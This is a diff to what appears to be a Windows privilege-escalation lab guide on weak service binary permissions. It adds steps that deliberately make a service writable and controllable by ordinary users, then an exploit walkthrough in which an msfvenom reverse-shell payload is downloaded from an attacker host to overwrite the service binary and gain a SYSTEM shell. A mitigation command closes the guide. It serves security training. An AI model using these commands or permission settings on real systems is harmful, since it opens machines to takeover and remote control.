@@ -31,16 +31,22 @@ mkdir "C:\Program Files\CustomSrv2\"
 
 2) Download the file [Service2.exe](/Lab-Setup-Binary/Service2.exe) to the 'C:\Program Files\CustomSrv2' directory.
 
-3) Grant write privileges to BUILTIN\Users for the 'Service2.exe' binary:
+3) Grant modify privileges to BUILTIN\Users for the service folder:
 
 ```
-icacls "C:\Program Files\CustomSrv2\Service2.exe" /grant BUILTIN\Users:W
+icacls "C:\Program Files\CustomSrv2\Service2.exe" /grant BUILTIN\Users:M
 ```
 
 4) Install the new Service:
 
 ```
 New-Service -Name "Vulnerable Service 2" -BinaryPathName "C:\Program Files\CustomSrv2\Service2.exe" -DisplayName "Vuln Service 2" -Description "My Custom Vulnerable Service 2" -StartupType Automatic
+```
+
+5) Edit new service's permissions to be controlled by BUILTIN\Users:
+
+```
+cmd.exe /c 'sc sdset "Vulnerable Service 2" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)(A;;RPWP;;;BU)'
 ```
 
 Outcome:
@@ -123,7 +129,6 @@ Outcome:
 - The service automatically starts after machine boots.
 - The Local System runs the service.
 - The service is running.
-- The current user can stop the service.
 
 ### Tool Enumeration
 
@@ -147,14 +152,39 @@ To abuse this vulnerability you should follow these steps:
 sc stop "Vulnerable Service 2"
 ```
 
-2) 
+Outcome:
+
+![Weak-Service-Binary-Exploitaion-Part-1](/Pictures/Weak-Service-Binary-Exploitaion-Part-1.png)
+
+2) Create with msfvenom a malicious exe file:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > Service2.exe
+```
+
+3) Open a listener in your kali machine.
+
+4) Transfer and overwrite the Service2.exe file with the malicious binary:
+
+```
+iwr -Uri http://<ip>:<port>/Service2.exe -Outfile C:\Program Filese\CustomSrv2\Service2.exe
+```
+
+5) Start the service with the following command or reboot the machine:
+
+```
+sc start "Vulnerable Service 2"
+```
+6) Verify the reverse shell on your Kali machine:
+
+![Weak-Service-Binary-Permissions-Reverse-Shell](/Pictures/Weak-Service-Binary-Permissions-Reverse-Shell.png)
 
 ## Mitigation
 
 To defend against Weak Service Binary Permissions vulnerabilities, adjust permissions on Service executables initiated through this mechanism. This limits unauthorized access and strengthens security measures:
 
 ```
-icacls "C:\Program Files\CustomSrv2\Service2.exe" /remove:g BUILTIN\Users:(W)
+icacls "C:\Program Files\CustomSrv2\Service2.exe" /remove:g BUILTIN\Users:(M)
 ```
 
 ## References
